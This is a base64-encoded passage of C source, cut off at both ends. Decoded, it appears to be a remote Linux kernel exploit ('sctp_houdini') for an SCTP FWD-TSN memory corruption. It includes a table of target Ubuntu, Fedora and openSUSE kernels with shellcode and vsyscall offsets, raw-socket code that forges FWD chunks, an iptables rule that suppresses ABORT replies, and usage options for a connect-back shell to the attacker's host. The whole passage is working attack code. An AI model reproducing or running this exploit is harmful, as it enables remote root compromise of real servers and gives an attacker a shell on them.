IA0KICAgICAgc2l6ZW9mKGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSkgLTEsIA0KICAgICAgX19PRkZTRVRfUE9SVF82NCwNCiAgICAgIF9fT0ZGU0VUX0hPU1RfNjQsDQogICAgICB1YnVudHU2NF8yXzZfMjdfN19zZXJ2ZXJfeDg2XzY0X3ZzeXNfc2hhZG93LA0KICAgICAgZ2VuZXJpY194ODZfNjRfanVtcCwNCiAgICAgIDYsDQogICAgICBnZW5lcmljX3g4Nl82NF9wYXRjaGp1bXAsDQogICAgICA4LA0KICAgICAgNDAsDQogICAgICA5NiwNCiAgICAgIDgsDQogICAgICBOVUxMLA0KICAgICAgU0xVQl9BTExPQ0FUT1INCiAgICB9LA0KICAgIHsgDQogICAgICAidWJ1bnR1NjRfaW50cmVwaWQtMi42LjI3LVs5LWxhc3RdLXNlcnZlciIsIA0KICAgICAgIihrZXJuZWwgMi42LjI3LTkgdG8gdGhlIGxhc3QgdW5wYXRjaGVkIGtlcm5lbCAtLSBzZXJ2ZXIpIiwNCiAgICAgIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSwgDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwgDQogICAgICBfX09GRlNFVF9QT1JUXzY0LA0KICAgICAgX19PRkZTRVRfSE9TVF82NCwNCiAgICAgIHVidW50dTY0XzJfNl8yN185dG9sYXN0X3NlcnZlcl94ODZfNjRfdnN5c19zaGFkb3csDQogICAgICBnZW5lcmljX3g4Nl82NF9qdW1wLA0KICAgICAgNiwNCiAgICAgIGdlbmVyaWNfeDg2XzY0X3BhdGNoanVtcCwNCiAgICAgIDgsDQogICAgICA0MCwNCiAgICAgIDk2LA0KICAgICAgOCwNCiAgICAgIE5VTEwsDQogICAgICBTTFVCX0FMTE9DQVRPUg0KICAgIH0sDQogICAgeyANCiAgICAgICJ1YnVudHU2NF9pbnRyZXBpZC0yLjYuMjctWzctbGFzdF0tZ2VuZXJpYyIsIA0KICAgICAgIihrZXJuZWwgMi42LjI3LTkgdG8gdGhlIGxhc3QgdW5wYXRjaGVkIGtlcm5lbCAtLSBzZXJ2ZXIpIiwNCiAgICAgIGdlbmVyaWNfeDg2XzY0X3NoZWxsY29kZSwgDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwgDQogICAgICBfX09GRlNFVF9QT1JUXzY0LA0KICAgICAgX19PRkZTRVRfSE9TVF82NCwNCiAgICAgIHVidW50dTY0XzJfNl8yN183dG9sYXN0X2dlbmVyaWNfeDg2XzY0X3ZzeXNfc2hhZG93LA0KICAgICAgZ2VuZXJpY194ODZfNjRfanVtcCwNCiAgICAgIDYsDQogICAgICBnZW5lcmljX3g4Nl82NF9wYXRjaGp1bXAsDQogICAgICA4LA0KICAgICAgNDAsDQogICAgICA5NiwNCiAgICAgIDgsDQogICAgICBOVUxMLA0KICAgICAgU0xVQl9BTExPQ0FUT1INCiAgICB9LA0KICAgIHsNCiAgICAgICJmZWRvcmE2NF8xMC0yLjYuMjUtMTE3IiwNCiAgICAgICIoZmVkb3JhIGNvcmUgMTAgZGVmYXVsdCBpbnN0YWxsZWQga2VybmVsKSIsDQogICAgICBnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUsDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwNCiAgICAgIF9fT0ZGU0VUX1BPUlRfNjQsDQogICAgICBfX09GRlNFVF9IT1NUXzY0LA0KICAgICAgZmVkb3JhNjRfMTBfZGVmYXVsdF9rZXJuZWxfeDg2XzY0X3ZzeXNfc2hhZG93LA0KICAgICAgZ2VuZXJpY194ODZfNjRfanVtcCwNCiAgICAgIDYsDQogICAgICBnZW5lcmljX3g4Nl82NF9wYXRjaGp1bXAsDQogICAgICA4LA0KICAgICAgNDAsDQogICAgICA5NiwNCiAgICAgIDgsDQogICAgICBmZWRvcmE2NF8xMF9kZWZhdWx0X2tlcm5lbF94ODZfNjRfc2VsaW51eCwNCiAgICAgIFNMVUJfQUxMT0NBVE9SDQogICAgfSwNCiAgICB7DQogICAgICAib3BlbnN1c2U2NF8xMS4xLTIuNi4yNy43LTktZGVmYXVsdCIsDQogICAgICAiKG9wZW5zdXNlIDExLjEgZGVmYXVsdCBpbnN0YWxsZWQga2VybmVsKSIsDQogICAgICBnZW5lcmljX3g4Nl82NF9zaGVsbGNvZGUsDQogICAgICBzaXplb2YoZ2VuZXJpY194ODZfNjRfc2hlbGxjb2RlKSAtMSwNCiAgICAgIF9fT0ZGU0VUX1BPUlRfNjQsDQogICAgICBfX09GRlNFVF9IT1NUXzY0LA0KICAgICAgb3BlbnN1c2U2NF8xMV8xX2RlZmF1bHRfa2VybmVsX3g4Nl82NF92c3lzX3NoYWRvdywNCiAgICAgIGdlbmVyaWNfeDg2XzY0X2p1bXAsDQogICAgICA2LA0KICAgICAgZ2VuZXJpY194ODZfNjRfcGF0Y2hqdW1wLA0KICAgICAgOCwNCiAgICAgIDQwLA0KICAgICAgMjU2LCANCiAgICAgIDgsDQogICAgICBOVUxMLA0KICAgICAgU0xBQl9BTExPQ0FUT1INCiAgICB9DQp9Ow0KDQoNCg0KLyogbW9kdWxhciBhcml0aG1ldGljIHNoaWZ0ICovDQojZGVmaW5lIF9fU0hJRlRfQ0hFQ0sgMHg3RkZGDQpzdGF0aWMgX191MTYgc2hpZnRfMF90b183ZmZmWzNdID0geyAweDdGRkYsIDB4RkZGRSwgMHgwMDAwIH07DQpzdGF0aWMgX191MTYgc2hpZnRfODAwMF90b19mZmZmWzNdID0geyAweEZGRkYsIDB4N0ZGRSwgMHg4MDAwIH07DQoNCi8qIGdsb2JhbCBzdHJlYW1zIG9iaiAqLw0Kc3RhdGljIF9fdTE2IHN0cmVhbXNbMTAwMF1bMl07DQoNCi8qIGdldCBzdHJlYW0gZmxvdyAqLw0Kc3RhdGljIGludCBidWlsZF9zdHJlYW0oY29uc3Qgdm9pZCAqZGF0YSwgX191MzIgc2l6ZSwgX191MTYgZmMpDQp7DQogIGludCBjaHVua19udW0saSxqLHN0bnVtPTA7DQogIF9fdTE2ICpwOw0KICBfX3UxNiAqc2hpZnQ7DQogIGlmKHNpemUgJSAyKQ0KICAgIF9fZmF0YWwoIlshISFdIGJ1aWxkX3N0cmVhbTogZGF0YSB1bmFsaWduZWQiKTsNCg0KICBtZW1zZXQoc3RyZWFtcywgMHgwMCwgc2l6ZW9mKHN0cmVhbXMpKTsNCg0KICBjaHVua19udW0gPSBzaXplIC8gMjsNCiAgcCA9IChfX3UxNiopZGF0YTsNCiAgZm9yKGk9MDsgaTxjaHVua19udW07IGkrKywgcCsrLCBmYysrKQ0KICB7DQogICAgX191MTYgdmFsICA9ICpwIC0gMTsgDQogICAgaWYodmFsIDw9IF9fU0hJRlRfQ0hFQ0spDQogICAgICBzaGlmdCA9IHNoaWZ0XzBfdG9fN2ZmZjsNCiAgICBlbHNlDQogICAgICBzaGlmdCA9IHNoaWZ0XzgwMDBfdG9fZmZmZjsgDQoNCiAgICBmb3Ioaj0wOyBqPDM7IGorKykNCiAgICB7DQogICAgICBzdHJlYW1zW3N0bnVtXVswXSA9IGZjOw0KICAgICAgc3RyZWFtc1tzdG51bSsrXVsxXSA9IHNoaWZ0W2pdOw0KICAgIH0NCg0KICAgIHN0cmVhbXNbc3RudW1dWzBdID0gZmM7DQogICAgc3RyZWFtc1tzdG51bSsrXVsxXSA9IHZhbDsNCiAgfQ0KDQogIHJldHVybiBzdG51bSA/IHN0bnVtIDogMDsgDQp9DQoNCg0KLyogc29tZSBzY3RwIHBhY2tldCBoZWFkZXIgc3RydWN0cyAqLw0Kc3RydWN0IHNjdHBfaGRyDQp7DQogIF9fdTE2IHNwb3J0Ow0KICBfX3UxNiBkcG9ydDsNCiAgX191MzIgdnRhZzsNCiAgX191MzIgY2hlY2tzdW07IA0KICBjaGFyIGNodW5rc1swXTsNCn1fX2F0dHJpYnV0ZV9fKChwYWNrZWQpKTsNCg0Kc3RydWN0IHNjdHBfY2hrDQp7DQogIF9fdTggdHlwZTsNCiAgX191OCBmbGFnczsNCiAgX191MTYgbGVuOw0KICBjaGFyIGRhdGFbMF07DQp9X19hdHRyaWJ1dGUoKHBhY2tlZCkpOw0KDQpzdHJ1Y3Qgc2N0cF9jaHVua19md2QNCnsNCiAgX191OCB0eXBlOw0KICBfX3U4IGZsYWdzOw0KICBfX3UxNiBsZW47DQogIF9fdTMyIG5ld190c247DQp9X19hdHRyaWJ1dGVfXygocGFja2VkKSk7DQoNCg0KDQplbnVtIA0Kew0KICBTQ1RQX0lOSVRfQUNLID0gMiwNCiAgU0NUUF9TQUNLID0gMywNCiAgU0NUUF9GV0QgPSAxOTINCn07DQoNCg0Kdm9pZCBkaXNhYmxlX2Fib3J0KCkNCnsNCiAgLyogbGFtZSB0cmljayB0byBibG9jayAgQUJPUlQgY2h1bmtzIGZyb20gcmVhY2hpbmcgdGhlIHRhcmdldCENCiAgICogQUJPUlQgbWVzc2FnZXMgYXJlIGdlbmVyYXRlZCBiZWNhdXNlIHdlIHJlY2VpdmUgYSBTQUNLIHdpdGggYW4gb3V0LW9mLWJvdW5kIFRTTiANCiAgICogaW4gcmVwbHkgdG8gYWxsIGZha2UgRldEIHNlbnQNCiAgICogKHdoZW4gdGhpcyBoYXBwZW5zIGxvY2FsIGtlcm5lbCBraWxscyB0aGUgY29ubmVjdGlvbikNCiAgICovDQoNCiAgc3lzdGVtKCJpcHRhYmxlcyAtdCBmaWx0ZXIgLUEgT1VUUFVUIC1wIHNjdHAgLS1jaHVuay10eXBlcyBhbnkgQUJPUlQgLWogRFJPUCIpOw0KfQ0KDQojZGVmaW5lIEZXRF9NQVhfU0laRSAweDEwMDANCnZvaWQgKm1ha2VfZndkX3BhY2tldChfX3UxNiBzcCwgX191MTYgZHAsIF9fdTMyIHZ0YWcsIF9fdTMyIHRzbiwgDQogICAgICAgICAgICAgICAgICAgICAgX191MTYgc3RyZWFtc1tdWzJdLCBpbnQgc3RyZWFtbGVuLCBpbnQgKnBfbGVuKQ0Kew0KICBpbnQgaTsgIA0KICBfX3UxNiAqcHN0cmVhbTsNCiAgc3RydWN0IHNjdHBfaGRyICpoZHI7DQogIHN0cnVjdCBzY3RwX2NodW5rX2Z3ZCAqZndkOw0KICBfX3U4ICpfX2J1ZmYgPSBtYWxsb2MoRldEX01BWF9TSVpFKTsNCiAgbWVtc2V0KF9fYnVmZiwgMCwgRldEX01BWF9TSVpFKTsNCg0KICBoZHIgPSAoc3RydWN0IHNjdHBfaGRyICopX19idWZmOw0KDQogIGhkci0+c3BvcnQgPSBodG9ucyhzcCk7DQogIGhkci0+ZHBvcnQgPSBodG9ucyhkcCk7DQogIGhkci0+dnRhZyA9IGh0b25sKHZ0YWcpOw0KICBoZHItPmNoZWNrc3VtID0gMDsNCiAgZndkID0gKHN0cnVjdCBzY3RwX2NodW5rX2Z3ZCAqKShoZHItPmNodW5rcyk7DQogIGZ3ZC0+dHlwZSA9IFNDVFBfRldEOw0KICBmd2QtPmZsYWdzID0gMDsNCiAgZndkLT5sZW4gPSBodG9ucyg0ICsgNCArIChzdHJlYW1sZW4gKiA0KSk7IC8vIGNodW5rICsgY3RzbiArIHN0cmVhbXMNCiAgZndkLT5uZXdfdHNuID0gaHRvbmwodHNuKzEpOw0KDQogIC8qIGJ1aWxkIHN0cmVhbSAqLw0KICBwc3RyZWFtID0gKF9fdTE2ICopKCgmKGZ3ZC0+bmV3X3RzbikpICsgMSk7DQogIGZvcihpPTA7IGk8c3RyZWFtbGVuOyBpKyspDQogIHsNCiAgICAqcHN0cmVhbSsrID0gc3RyZWFtc1tpXVswXTsNCiAgICAqcHN0cmVhbSsrID0gc3RyZWFtc1tpXVsxXTsNCiAgfQ0KDQogICpwX2xlbiA9IG50b2hzKGZ3ZC0+bGVuKSArIHNpemVvZigqaGRyKTsNCiAgaGRyLT5jaGVja3N1bSA9IGh0b25sKHNjdHBfY3JjMzJjKF9fYnVmZiwgKF9fdTMyKSgqcF9sZW4pKSk7DQogIHJldHVybiBoZHI7IA0KfQ0KDQoNCg0KLyogdGhpcyBmdW5jdGlvbiBnZXRzIFZUQUcvVFNOIGJvdW5kIHdpdGggdGhpcyBzb2NrZXQgcGFpciAqLw0KaW50IHJhd19zb2NrZXRfZW5naW5lKF9fdTE2IHNwLCBfX3UxNiBzcDIsIF9fdTE2IGRwLCANCiAgICAgICAgICAgICAgICAgICAgICBfX3UzMiAqdHNuLCBfX3UzMiAqdnRhZywgX191MzIgKnRzbjIsIF9fdTMyICp2dGFnMikNCnsNCiAgY2hhciBwYWNrZXRbMTUwMF07DQogIGludCBwX2xlbjsNCiAgdm9pZCAqZW5kOw0KICBzdHJ1Y3Qgc2N0cF9oZHIgKmhkcjsNCiAgc3RydWN0IHNjdHBfY2hrICpjaGs7DQogIF9fdTMyIHRtcDsgDQogIF9fdTE2IHBzcCxwZHA7DQogIGZkX3NldCByOw0KICBzdHJ1Y3QgdGltZXZhbCB0djsNCg0KICBpbnQgcmF3X2ZkID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX1NDVFApOw0KICBpZihyYXdfZmQgPCAwKQ0KICAgIF9fZmF0YWxfcGVycm9yKCJzb2NrZXQ6IFJBVy9TQ1RQIik7DQoNCg0KICBGRF9aRVJPKCZyKTsNCiAgRkRfU0VUKHJhd19mZCwgJnIpOw0KICB0di50dl91c2VjPTA7DQogIHR2LnR2X3NlYz0xMDsNCg0KICB3aGlsZShzZWxlY3QocmF3X2ZkICsgMSwgJnIsIE5VTEwsTlVMTCwmdHYpID4gMCkNCiAgew0KICAgIHBfbGVuID0gcmVhZChyYXdfZmQsIHBhY2tldCwgc2l6ZW9mKHBhY2tldCkpOw0KICAgIGVuZCA9IHBhY2tldCArIHBfbGVuOw0KICAgIGhkciA9IChzdHJ1Y3Qgc2N0cF9oZHIgKikocGFja2V0ICsgc2l6ZW9mKHN0cnVjdCBpcGhkcikpOw0KICAgIGlmKCh2b2lkKikoKChjaGFyICopaGRyKSs0KSAgPj0gZW5kKSANCiAgICAgIGNvbnRpbnVlOw0KDQogICAgLyogY2hlY2sgZm9yIGNodW5rICovDQogICAgY2hrID0gKHN0cnVjdCBzY3RwX2NoayAqKShoZHItPmNodW5rcyk7IA0KICAgIHRtcCAgPSAgbnRvaGwoKigoX191MzIqKShjaGstPmRhdGEpKSk7DQogICAgcHNwID0gbnRvaHMoaGRyLT5zcG9ydCk7DQogICAgcGRwID0gbnRvaHMoaGRyLT5kcG9ydCk7DQogICAgDQogICAgaWYoY2hrLT50eXBlID09IFNDVFBfU0FDSykNCiAgICB7IA0KICAgICAgaWYocHNwID09IGRwICYmIHBkcCA9PSBzcCkNCiAgICAgICAgKnRzbiAgPSAgdG1wOw0KDQogICAgICBpZihwc3AgPT0gZHAgJiYgcGRwID09IHNwMikNCiAgICAgICAgKnRzbjIgID0gIHRtcDsNCiAgICB9DQogICAgDQogICAgaWYoY2hrLT50eXBlID09IFNDVFBfSU5JVF9BQ0spIA0KICAgIHsNCiAgICAgIGlmKHBzcCA9PSBkcCAmJiBwZHAgPT0gc3ApDQogICAgICAgICp2dGFnID0gIHRtcDsNCiAgICANCiAgICAgIGlmKHBzcCA9PSBkcCAmJiBwZHAgPT0gc3AyKQ0KICAgICAgICAqdnRhZzIgPSAgdG1wOw0KICAgIH0NCg0KICAgIGlmKCp2dGFnICYmICp0c24gJiYgKnZ0YWcyICYmICp0c24yKQ0KICAgICAgYnJlYWs7DQoNCiAgICBGRF9aRVJPKCZyKTsNCiAgICBGRF9TRVQocmF3X2ZkLCAmcik7DQogICAgdHYudHZfdXNlYz0wOw0KICAgIHR2LnR2X3NlYz0xMDsNCiAgfSANCg0KICByZXR1cm4gMDsNCn0NCg0KLyogZ2xvYmFsIHZhcnMgKi8NCnN0YXRpYyBfX3UxNiBzcG9ydD0wOw0Kc3RhdGljIF9fdTE2IHNwb3J0Mj0wOw0Kc3RhdGljIF9fdTMyIHZ0YWc9MCwgdnRhZzI9MDsNCnN0YXRpYyBfX3UzMiB0c249MCwgdHNuMj0wOw0KDQpzdGF0aWMgc3RydWN0IHNvY2thZGRyX2luIHNlcnZlcl9zY3RwOw0KaW50IHJhd19zY3RwPS0xOw0KDQojZGVmaW5lIFNUQUNLX1NJWkUgMHgxMDAwDQpjaGFyIGNsb25lX3N0YWNrW1NUQUNLX1NJWkUqMl07DQoNCg0Kc3RhdGljIHZvaWQgc2VuZF9md2RfY2h1bmsoX191MTYgc3AsIF9fdTE2IGRwLCBfX3UxNiBzdHJlYW1zW11bMl0sIA0KICAgICAgICAgICAgICAgICAgICBpbnQgc3RyZWFtbGVuLCBfX3UzMiB2dGFnLCBfX3UzMiB0c24pDQp7DQogIGludCBwX2xlbj0wLCByZXQ7DQogIHZvaWQgKnBhY2tldCA9IG1ha2VfZndkX3BhY2tldChzcCwgZHAsIHZ0YWcsIHRzbiwgc3RyZWFtcywgc3RyZWFtbGVuLCAmcF9sZW4pOw0KICByZXQgPSBzZW5kdG8ocmF3X3NjdHAsIHBhY2tldCwgcF9sZW4sIDAsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2VydmVyX3NjdHAsIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pKTsgDQogIGlmKHJldCA8IDApDQogICAgX19mYXRhbF9wZXJyb3IoInNlbmR0bzogc2VuZGluZyBGV0QgY2h1bmsiKTsNCg0KICBmcmVlKHBhY2tldCk7DQp9DQoNCg0KDQpzdGF0aWMgaW50IGNsb25lX3RocmVhZCh2b2lkICpwKQ0Kew0KICByYXdfc29ja2V0X2VuZ2luZShzcG9ydCwgc3BvcnQyLCBoLnJwb3J0LCAmdHNuLCAmdnRhZywgJnRzbjIsICZ2dGFnMik7DQogIHJldHVybiAwOw0KfQ0KDQoNCnN0YXRpYyBpbnQgbWFrZV9zY3RwX2Nvbm5lY3Rpb24oX191MTYgc3AsIF9fdTE2IGRwLCBpbnQgZGF0YSkNCnsNCiAgc3RydWN0IHNjdHBfaW5pdG1zZyBtc2c7DQogIGludCByZXQsbz0xLGZkOw0KICBzb2NrbGVuX3QgbGVuX3NjdHA9c2l6ZW9mKHN0cnVjdCBzY3RwX2luaXRtc2cpOw0KICBzdHJ1Y3Qgc29ja2FkZHJfaW4gcyxjOw0KDQogIGZkID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1NDVFApOw0KICBpZihmZCA8IDApDQogICAgX19mYXRhbF9wZXJyb3IoInNvY2tldDogc2N0cCBTT0NLX1NUUkVBTSIpOw0KDQogIHJldCA9IHNldHNvY2tvcHQoZmQsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgKGNoYXIgKikmbywgc2l6ZW9mKG8pKTsNCiAgaWYgKHJldCA8IDApIA0KICAgX19mYXRhbF9wZXJyb3IoInNldHNvY2tvcHQ6IFNPX1JFVVNFQUREUiIpOw0KDQoNCiAgLyogTk9URTogaGVyZSB3ZSBhc3N1bWUgc2VydmVyIHBlZXIgYWxsb2NhdGVzICAxMCBvdXRwdXQgc3RyZWFtcyAoYXMgZGVmYXVsdCkNCiAgICogaWYgdGhlIGFwcGxjaWF0aW9uIGJlaGF2ZXMgZGlmZmVyZW50bHkgeW91IG11c3QgcHJvYmUgYW5kIGNoYW5nZSBjaGFubmVscyBzaXplDQogICAqIHRvIGdldCB0aGUgY29ycmVjdCBzbGFiICAqLw0KDQogIGlmKGstPmFsbG9jYXRvcl90eXBlID09IFNMQUJfQUxMT0NBVE9SKSAvLyBpZiBTTEFCIGNoYW5nZSBjaGFubmVsIHNpemUgDQogIHsNCiAgICBnZXRzb2Nrb3B0KGZkLCBTT0xfU0NUUCwgU0NUUF9JTklUTVNHLCAmbXNnLCAmbGVuX3NjdHApOw0KICAgIG1zZy5zaW5pdF9udW1fb3N0cmVhbXM9NTA7IC8vIGZvcmNlIDI1NiBzbGFiIGFsbG9jYXRpb24NCiAgICBtc2cuc2luaXRfbWF4X2luc3RyZWFtcz0xMDsNCiAgICBzZXRzb2Nrb3B0KGZkLCBTT0xfU0NUUCwgU0NUUF9JTklUTVNHLCAmbXNnLCBsZW5fc2N0cCk7DQogIH0NCiAgZWxzZQ0KICB7DQogICAgZ2V0c29ja29wdChmZCwgU09MX1NDVFAsIFNDVFBfSU5JVE1TRywgJm1zZywgJmxlbl9zY3RwKTsNCiAgICBtc2cuc2luaXRfbnVtX29zdHJlYW1zPTEwOyAvLyBmb3JjZSA5NiBzbGFiIGFsbG9jYXRpb24NCiAgICBtc2cuc2luaXRfbWF4X2luc3RyZWFtcz0xMDsNCiAgICBzZXRzb2Nrb3B0KGZkLCBTT0xfU0NUUCwgU0NUUF9JTklUTVNHLCAmbXNnLCBsZW5fc2N0cCk7DQogIH0NCg0KDQogIGlmKHNwKQ0KICB7DQogICAgYy5zaW5fZmFtaWx5ID0gUEZfSU5FVDsNCiAgICBjLnNpbl9wb3J0ID0gaHRvbnMoc3ApOw0KICAgIGMuc2luX2FkZHIuc19hZGRyID0gSU5BRERSX0FOWTsNCiAgICByZXQgPSBiaW5kKGZkLCAoc3RydWN0IHNvY2thZGRyICopJmMsIHNpemVvZihjKSk7DQogICAgaWYocmV0IDwgMCkNCiAgICAgIF9fZmF0YWxfcGVycm9yKCJiaW5kOiBzY3RwIHNvY2tldCIpOw0KICB9DQoNCiAgcy5zaW5fZmFtaWx5ID0gUEZfSU5FVDsNCiAgcy5zaW5fcG9ydCAgID0gaHRvbnMoZHApOyANCiAgcy5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoaC5yaG9zdCk7DQoNCiAgcmV0ID0gY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZzLCBzaXplb2YocykpOw0KICBpZihyZXQgPCAwKQ0KICAgIF9fZmF0YWxfcGVycm9yKCJjb25uZWN0OiBzY3RwIHNvY2tldCIpOw0KDQogIA0KICAvKiBzZW5kIG9uZSBieXRlIG9mIGRhdGEgdG8gZ2V0IGNvcnJlY3RseSANCiAgICogVFNOIGZyb20gcmF3IHNvY2tldCAoZnJvbSBTQUNLIHJlcGxpZXMpIA0KICAgKi8NCiAgaWYoZGF0YSkNCiAgew0KICAgIHJldCA9IHNlbmQoZmQsICIiLCAxLCAwKTsNCiAgICBpZihyZXQgPCAwKQ0KICAgICAgX19mYXRhbF9wZXJyb3IoInNlbmQ6IHNjdHAgc29ja2V0IGRhdGEiKTsNCiAgfQ0KICByZXR1cm4gZmQ7DQp9DQoNCg0Kc3RhdGljIHZvaWQgaHRvbnNfc3RyZWFtcyhfX3UxNiBzW11bMl0sIGludCBsZW4pDQp7DQogIGludCBpOw0KICBmb3IoaT0wOyBpPGxlbjsgaSsrKQ0KICB7DQogICAgc1tpXVswXSA9IGh0b25zKHNbaV1bMF0pOw0KICAgIHNbaV1bMV0gPSBodG9ucyhzW2ldWzFdKTsNCiAgfQ0KfQ0KDQoNCnN0YXRpYyB2b2lkIHVzYWdlKCkNCnsNCiAgZnByaW50ZihzdGRlcnIsICIuL3NjdHBfaG91ZGluaSBcblx0Ig0KICAgICAgICAgICAgICAgICAgIi1IIGxob3N0ICAgKGxvY2FsIGhvc3QgYWRkcmVzcyBmb3IgY29ubmVjdCBiYWNrIHNoZWwpXG5cdCINCiAgICAgICAgICAgICAgICAgICItUCBscG9ydCAgIChsb2NhbCBwb3J0IGFkZHJlc3MgZm9yIGNvbm5lY3QgYmFjayBzaGVsbClcblx0Ig0KICAgICAgICAgICAgICAgICAgIi1oIHJob3N0ICAgKHJlbW90ZSB0YXJnZXQgaG9zdClcblx0Ig0KICAgICAgICAgICAgICAgICAgIi1wIHJwb3J0ICAgKHJlbW90ZSB0YXJnZXQgcG9ydClcblx0Ig0KICAgICAgICAgICAgICAgICAgIi10IGtlcm5lbCAgKHRhcmdldCBrZXJuZWwpXG5cdCINCiAgICAgICAgICAgICAgICAgICItcyBzcG9ydCAgIChzb3VyY2UgcG9ydCBkZWZpbmluZyBzY3RwIGFzc29jaWF0aW9uIHdoZXJlIGNvcnJ1cHRpb24gb2NjdXJzKVxuXHQiDQogICAgICAgICAgICAgICAgICAiICAgICAgICAgICAoYWx3YXlzIHVzZSBoaWdoZXIgcG9ydCBpZiB5b3UgcnVuIHRoZSBleHBsb2l0IG11bHRpcGxlIHRpbWVzIGVnLiAyMDAwMCwgMjEwMDAsIGV0Yy4uKVxuXHQiDQogICAgICAgICAgICAgICAgICAiICAgICAgICAgICAoTkVWRVIgcmV1c2UgdGhlIHNhbWUgb3IgbmV4dCBwb3J0IG9yIHZzeXMgd2lsbCBiZSB0cmFzaGVkIGFuZCBpbml0IHdpbGwgZGllIHNvb24uLi4pXG5cdCINCiAgICAgICAgICAgICAgICAgICItYyBjb25uICAgIChudW1iZXIgb2YgY29ubmVjdGlvbmlzIGJlZm9yZSBjb3JydXB0aW9uIC0gZGVmYXVsdCA2MDApXG4iDQogICAgICAgICAgICAgICAgICApOw0KfQ0KDQpzdGF0aWMgdm9pZCBzY3RwX2dldG9wdChpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICBpbnQgcmV0LGk7DQoNCiAgd2hpbGUoKHJldCA9IGdldG9wdChhcmdjLCBhcmd2LCAiSDpQOnA6aDp0OmM6czoiKSkgIT0gLTEpDQogIHsNCiAgICBzd2l0Y2gocmV0KQ0KICAgIHsNCiAgICAgIGNhc2UgJ1AnOg0KICAgICAgICBoLmxwb3J0ID0gYXRvaShvcHRhcmcpOyANCiAgICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgJ3AnOg0KICAgICAgICBoLnJwb3J0ID0gYXRvaShvcHRhcmcpOw0KICAgICAgICBicmVhazsNCg0KICAgICAgY2FzZSAndCc6DQogICAgICAgIGgudGFyZ2V0ID0gb3B0YXJnOw0KICAgICAgICBicmVhazsNCg0KICAgICAgY2FzZSAnaCc6DQogICAgICAgIGgucmhvc3QgPSBvcHRhcmc7DQogICAgICAgIGJyZWFrOw0KICAgIA0KICAgICAgY2FzZSAnSCc6DQogICAgICAgIGgubGhvc3QgPSBvcHRhcmc7DQogICAgDQogICAgICBjYXNlICdjJzoNCiAgICAgICAgaC5uY29ubiA9IGF0b2kob3B0YXJnKTsNCiAgICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgJ3MnOg0KICAgICAgICBoLnNwb3J0ID0gYXRvaShvcHRhcmcpOw0KICAgICAgICBicmVhazsNCiAgICB9DQogIH0NCg0KDQogIGlmKCFoLmxwb3J0IHx8ICFoLnJwb3J0IHx8ICFoLnJob3N0IHx8ICFoLnRhcmdldCB8fCAhaC5saG9zdCB8fCAhaC5zcG9ydCkNCiAgew0KICAgIHVzYWdlKCk7DQogICAgZXhpdCgxKTsNCiAgfQ0KDQogIGlmKGguc3BvcnQgPCBoLm5jb25uKzEpDQogIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwgIlNvdXJjZSBBc3NvY2lhdGlvbiBQb3J0IGlzIHRvbyBsb3c6ICVkXG4iLCBoLnNwb3J0KTsNCiAgICB1c2FnZSgpOyANCiAgICBleGl0KDEpOw0KICB9DQoNCiAgc3BvcnQ9aC5zcG9ydDsNCiAgc3BvcnQyPWguc3BvcnQgKyAxOw0KDQogIGZvcihpPTA7IGkgPCBzaXplb2Yoa2VybmVscykvc2l6ZW9mKGtpbmZvKTsgaSsrKQ0KICB7DQogICAgaWYoIXN0cmNtcChoLnRhcmdldCwga2VybmVsc1tpXS5uYW1lKSkNCiAgICB7DQogICAgICBrID0gJmtlcm5lbHNbaV07DQogICAgICBicmVhazsNCiAgICB9DQogIH0gIA0KDQogIGlmKGs9PU5VTEwpDQogIHsNCiAgICBmcHJpbnRmKHN0ZGVyciwgIlVuYWJsZSB0byBmaW5kIHRhcmdldDogJXNcbkF2YWlsYWJsZSB0YXJnZXRzIGFyZTpcbiIsIGgudGFyZ2V0KTsNCiAgICBmb3IoaT0wOyBpIDwgc2l6ZW9mKGtlcm5lbHMpL3NpemVvZihraW5mbyk7IGkrKykNCiAgICB7DQogICAgICBmcHJpbnRmKHN0ZGVyciwgIi0gJXMgICVzXG4iLCBrZXJuZWxzW2ldLm5hbWUsIGtlcm5lbHNbaV0uaW5mbyk7DQogICAgfQ0KICAgIGV4aXQoMSk7DQogIH0NCn0NCg0Kdm9pZCBwYXRjaGp1bXAoKQ0Kew0KICBpbnQgcmV0Ow0KDQogIF9fbXNnKCJbKipdIFJlc3RvcmluZyB2c3lzOiBFbXVsYXRlIGdldHRpbWVvZmRheSgpLi4uIFxuIik7DQogIHJldCA9IGJ1aWxkX3N0cmVhbShrLT52c3lzcGF0Y2hqdW1wLCBrLT52c3lzcGF0Y2hqdW1wc2l6ZSwgMCk7IA0KICBpZihyZXQgPCAwKQ0KICAgIF9fZmF0YWwoIkVycm9yIEJ1aWxkaW5nIFN0cmVhbXMuLi4iKTsNCg0KICBodG9uc19zdHJlYW1zKHN0cmVhbXMsIHJldCk7DQogIHNlbmRfZndkX2NodW5rKHNwb3J0MiwgaC5ycG9ydCwgc3RyZWFtcywgcmV0LCB2dGFnMiwgdHNuMik7IA0KDQp9DQoNCg0Kc3RhdGljIHZvaWQgbXVsdGlwbGV4KGludCBsaXN0ZW5mZCkNCnsNCiAgaW50IHJldCxuZXdfZmQ7DQogIGZkX3NldCByOw0KICBzdHJ1Y3QgdGltZXZhbCB0Ow0KICBjaGFyIGJ1ZmZlclsxNTAwXTsNCg0KDQogIEZEX1pFUk8oJnIpOw0KICBGRF9TRVQobGlzdGVuZmQsICZyKTsNCiAgdC50dl9zZW